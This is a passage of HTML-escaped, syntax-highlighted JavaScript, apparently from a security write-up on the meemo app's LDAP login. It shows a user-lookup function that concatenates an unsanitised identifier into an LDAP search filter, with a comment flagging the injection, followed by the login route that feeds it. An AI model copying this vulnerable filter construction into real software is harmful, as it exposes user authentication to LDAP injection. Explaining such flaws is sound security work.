class=\"nx\"\u003eCLOUDRON_LDAP_URL\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eldapjs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateClient\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_URL\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eLDAP error\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n        \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebind\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_BIND_DN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_BIND_PASSWORD\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eINTERNAL_ERROR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n            \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esearch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_USERS_BASE_DN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003efilter\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e(|(uid=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eidentifier\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e)(mail=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eidentifier\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e)(username=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eidentifier\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e)(sAMAccountName=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eidentifier\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e))\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e  \u003cspan class=\"c1\"\u003e//\u0026lt;-- INJECTION: identifier is not sanitized\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eINTERNAL_ERROR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n                \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[];\u003c/span\u003e\n\n                \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esearchEntry\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eentry\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eentry\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eobject\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n                \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eINTERNAL_ERROR\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n                \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eend\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estatus\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eNOT_FOUND\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003enon-zero status from LDAP search: \u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estatus\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n                    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eNOT_FOUND\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eNo LDAP entries found\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n                    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003efull\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e]);\u003c/span\u003e\n\n                    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                        \u003cspan class=\"na\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                        \u003cspan class=\"na\"\u003edisplayName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003edisplayname\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                        \u003cspan class=\"na\"\u003eemail\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e].\u003c/span\u003e\u003cspan class=\"nx\"\u003email\u003c/span\u003e\n                    \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\n                    \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eexports\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003emodule\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eexports\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eauth\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eauth\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003elogin\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003elogin\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003elogout\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003elogout\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"na\"\u003eprofile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eprofile\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\n\u003cspan class=\"p\"\u003e...\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// https://github.com/nebulade/meemo/blob/master/src/routes.js#L86\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003elogin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eres\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003etypeof\u003c/span\u003e \u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e400\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003emissing username\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003etypeof\u003c/span\u003e \u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epassword\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003estring\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e400\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003emissing password\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n    \u003cspan class=\"nx\"\u003eusers\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003everify\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ereq\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eNOT_FOUND\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e401\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einvalid credentials\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecode\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"nx\"\u003eUserError\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eNOT_AUTHORIZED\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e401\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003einvalid credentials\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003enext\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eHttpError\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e500\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\n        \u003cspan 